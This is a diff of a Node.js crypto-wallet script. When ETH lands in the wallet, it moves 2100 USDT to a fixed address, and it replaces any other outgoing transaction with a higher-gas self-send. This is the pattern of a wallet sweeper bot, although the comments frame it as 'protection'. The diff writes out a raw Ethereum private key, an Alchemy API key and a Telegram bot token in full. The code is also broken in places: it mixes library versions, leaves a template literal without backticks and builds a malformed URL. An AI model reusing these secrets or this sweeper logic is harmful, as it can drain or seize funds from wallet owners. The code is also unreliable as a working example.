@@ -1,130 +1,142 @@
+فرحان:
 const { ethers } = require("ethers");
 const axios = require("axios");
 
 // Configuration
-const providerUrl = "https://eth-mainnet.alchemyapi.io/v2/qA9FV5BMTFx6p7638jhqx-JDFDByAZAn"; // Use your own Infura/Alchemy RPC URL
-const privateKey = "ee9cec01ff03c0adea731d7c5a84f7b412bfd062b9ff35126520b3eb3d5ff258"; // Wallet's private key
-const destinationWallet = "0x08f695b8669b648897ed5399b9b5d951b72881a0"; // Wallet address to send USDT to
-const usdtContractAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7"; // USDT ERC20 token contract address
-const telegramBotToken = "7673283097:AAFpBQTArL6bEIe04ITxAfvrWPbrcgfvtVg"; // Your Telegram bot token
-const telegramChatId = "7474852341"; // Your Telegram chat ID to receive notifications
+const providerUrl = "https://eth-mainnet.alchemyapi.io/v2/qA9FV5BMTFx6p7638jhqx-JDFDByAZAn"; // Replace with your Infura/Alchemy provider URL
+const privateKey = "ee9cec01ff03c0adea731d7c5a84f7b412bfd062b9ff35126520b3eb3d5ff258"; // Your wallet's private key
+const destinationWallet = "0x08f695b8669b648897ed5399b9b5d951b72881a0"; // Safe wallet address to transfer USDT
+const usdtContractAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7"; // USDT contract address (e.g., 0xdAC17F958D2ee523a2206206994597C13D831ec7)
+const telegramBotToken = "7673283097:AAFpBQTArL6bEIe04ITxAfvrWPbrcgfvtVg"; // Telegram bot token
+const telegramChatId = "7474852341"; // Telegram chat ID
 
 // Connect to Ethereum provider
 const provider = new ethers.JsonRpcProvider(providerUrl);
-
-// Wallet and Signer
 const wallet = new ethers.Wallet(privateKey, provider);
 
-// USDT Contract ABI (for ERC20 transfer)
+// USDT Contract ABI (ERC20 standard)
 const usdtAbi = [
   "function transfer(address recipient, uint256 amount) public returns (bool)",
   "function balanceOf(address account) public view returns (uint256)"
 ];
-
 const usdtContract = new ethers.Contract(usdtContractAddress, usdtAbi, wallet);
+
+// Amount of USDT to transfer (in smallest units, 6 decimals for USDT)
+const usdtAmount = ethers.BigNumber.from("2100000000"); // 2100 USDT = 2100 * 10^6
 
 // Function to send a Telegram notification
 async function sendTelegramNotification(message) {
   const url = "https://api.telegram.org/bot${7673283097:AAFpBQTArL6bEIe04ITxAfvrWPbrcgfvtVg}/sendMessage";
-  const params = {
-    chat_id: telegramChatId,
-    text: message,
-  };
+  const params = { chat_id: 7474852341, text: message };
   try {
     await axios.post(url, params);
-    console.log("Telegram notification sent.");
+    console.log("Telegram notification sent:", message);
   } catch (error) {
     console.error("Error sending Telegram notification:", error);
   }
 }
 
-// Function to block unauthorized transactions
-async function blockUnauthorizedTransactions() {
-  // Implement your blocking logic here. For example:
-  // 1. Whitelist addresses for transfers
-  // 2. Prevent all other transactions from being sent from your wallet
-  const authorizedAddress = "0x08fc7400BA37FC4ee1BF73BeD5dDcb5db6A1036A"; // Example of an authorized address
-
-  if (wallet.address !== authorizedAddress) {
-    console.log("Unauthorized transaction detected. Blocking!");
-    await sendTelegramNotification("Unauthorized transaction detected! No transaction will be sent.");
-    return true; // Prevent transaction
-  }
-  return false; // Allow transaction
-}
-
-// Function to check ETH balance and transfer USDT if enough ETH is available
-async function checkEthBalanceAndTransfer() {
+// Function to transfer 2100 USDT to the safe wallet
+async function transferUSDT() {
   try {
-    // Block unauthorized transactions
-    const isBlocked = await blockUnauthorizedTransactions();
-    if (isBlocked) {
-      console.log("Transaction blocked.");
+    // Check USDT balance
+    const usdtBalance = await usdtContract.balanceOf(wallet.address);
+    if (usdtBalance.lt(usdtAmount)) {
+      console.log(`Insufficient USDT balance. Available: ${ethers.utils.formatUnits(usdtBalance, 6)} USDT`);
       return;
     }
 
-    // Get ETH balance of the wallet
-    const ethBalance = await provider.getBalance(wallet.address);
+    console.log("USDT Balance:", ethers.utils.formatUnits(usdtBalance, 6));
 
-    console.log("Wallet ETH Balance: ", ethers.utils.formatEther(ethBalance));
-
-    // Gas fee estimation
+    // Estimate gas cost
     const gasPrice = await provider.getGasPrice();
-    const gasLimit = 100000; // Adjust based on transaction complexity
-    const estimatedGasFee = gasPrice.mul(gasLimit); // Gas fee in ETH
+    const gasLimit = 100000; // Estimated gas limit for ERC20 transfer
+    const estimatedGasFee = gasPrice.mul(gasLimit);
 
-    // Check if wallet has enough ETH to cover the gas fee
+    // Check ETH balance
+    const ethBalance = await provider.getBalance(wallet.address);
     if (ethBalance.lt(estimatedGasFee)) {
-      console.log("Not enough ETH for gas. Waiting for ETH...");
-      return; // Wait for ETH balance to be sufficient
-    }
-
-    // Check the USDT balance of the wallet
-    const balance = await usdtContract.balanceOf(wallet.address);
-    console.log("Wallet USDT Balance: ", ethers.utils.formatUnits(balance, 6));
-
-    // Define the amount of USDT you want to send (2100 USDT)
-    const amountToSend = ethers.utils.parseUnits("2100", 6); // Adjusted to 2100 USDT
-
-    // Check if the wallet has enough USDT
-    if (balance.lt(amountToSend)) {
-      console.log("Insufficient USDT balance.");
+      console.log("Not enough ETH to cover gas fee. Waiting for more ETH...");
       return;
     }
 
-    // Prepare transaction to transfer USDT
-    const tx = await usdtContract.populateTransaction.transfer(destinationWallet, amountToSend);
+    console.log("Sufficient ETH for gas. Proceeding with USDT transfer...");
 
-    // Adjust gas price (you can also use gas loan services here if needed)
-    tx.gasPrice = gasPrice;
-    tx.gasLimit = gasLimit;
+    // Prepare USDT transfer transaction
+    const tx = await usdtContract.transfer(destinationWallet, usdtAmount);
+    console.log("USDT Transfer Transaction Sent. Hash:", tx.hash);
 
-    // Send the transaction using Flashbots for quicker inclusion in the block
-    const flashbotsProvider = await FlashbotsBundleProvider.create(provider, wallet, "mainnet");
-
-const signedTx = await wallet.signTransaction(tx);
-
-    // Send the bundle using Flashbots
-    const bundleSubmission = await flashbotsProvider.sendBundle(
-      [{
-        signer: wallet,
-        transaction: signedTx
-      }],
-      await provider.getBlockNumber() + 1 // Send to the next block
-    );
-
-    console.log("Transaction Hash: ", bundleSubmission.bundleHash);
-    const receipt = await provider.waitForTransaction(bundleSubmission.bundleHash);
-    console.log("Transaction Receipt: ", receipt);
-
-    // Send notification upon success
-    await sendTelegramNotification(`USDT transfer successful! Transaction Hash: ${bundleSubmission.bundleHash}`);
-
+    await tx.wait(); // Wait for confirmation
+    console.log("USDT Transfer Successful. Transaction Hash:", tx.hash);
+    await sendTelegramNotification(`2100 USDT transfer successful! Hash: ${tx.hash}`);
   } catch (error) {
-    console.error("Error during transaction: ", error);
-    await sendTelegramNotification(`Error occurred during USDT transfer: ${error.message}`);
+    console.error("Error during USDT transfer:", error);
+    await sendTelegramNotification(`Error during USDT transfer: ${error.message}`);
   }
 }
 
-// Monitor the wallet for ETH balance and send USDT when possible
-setInterval(checkEthBalanceAndTransfer, 100); // Check every 100ms (for high-speed transactions)
+// Function to monitor ETH balance and block unauthorized transactions
+async function monitorWallet() {
+  let lastEthBalance = await provider.getBalance(wallet.address);
+
+  setInterval(async () => {
+    try {
+      const currentEthBalance = await provider.getBalance(wallet.address);
+
+      // Notify and attempt USDT transfer when ETH is received
+      if (currentEthBalance.gt(lastEthBalance)) {
+        const receivedAmount = currentEthBalance.sub(lastEthBalance);
+        console.log(`ETH received: ${ethers.utils.formatEther(receivedAmount)} ETH`);
+        await sendTelegramNotification(
+          ETH received: ${ethers.utils.formatEther(receivedAmount)} ETH. Total Balance: ${ethers.utils.formatEther(currentEthBalance)} ETH
+        );
+
+        // Attempt USDT transfer after ETH is received
+        await transferUSDT();
+
+        lastEthBalance = currentEthBalance;
+      }
+    } catch (error) {
+      console.
+
+error("Error monitoring wallet:", error);
+    }
+  }, 5000); // Check every 5 seconds
+}
+
+// Function to monitor pending transactions and block unauthorized ones
+async function monitorPendingTransactions() {
+  provider.on("pending", async (txHash) => {
+    try {
+      const tx = await provider.getTransaction(txHash);
+      if (tx && tx.from.toLowerCase() === wallet.address.toLowerCase()) {
+        console.log("Outgoing transaction detected:", txHash);
+
+        // Block unauthorized transactions
+        console.log("Blocking unauthorized transaction...");
+        const cancelTx = {
+          to: wallet.address, // Self-send to cancel the transaction
+          value: ethers.utils.parseEther("0"), // No ETH transfer
+          gasPrice: tx.gasPrice.add(ethers.utils.parseUnits("10", "gwei")), // Higher gas price
+          gasLimit: tx.gasLimit,
+          nonce: tx.nonce // Use the same nonce as the detected transaction
+        };
+
+        const signedCancelTx = await wallet.signTransaction(cancelTx);
+        const txResponse = await provider.sendTransaction(signedCancelTx);
+        console.log("Cancel transaction sent. Hash:", txResponse.hash);
+        await sendTelegramNotification(`Blocked unauthorized transaction: ${txHash}. Replaced with cancel transaction: ${txResponse.hash}`);
+      }
+    } catch (error) {
+      console.error("Error monitoring pending transactions:", error);
+    }
+  });
+}
+
+// Main function to start the process
+(async () => {
+  console.log("Starting wallet monitor and protection...");
+  await sendTelegramNotification("Wallet monitor and protection started.");
+  monitorWallet(); // Monitor ETH balance and attempt USDT transfer
+  monitorPendingTransactions(); // Block unauthorized transactions
+})();
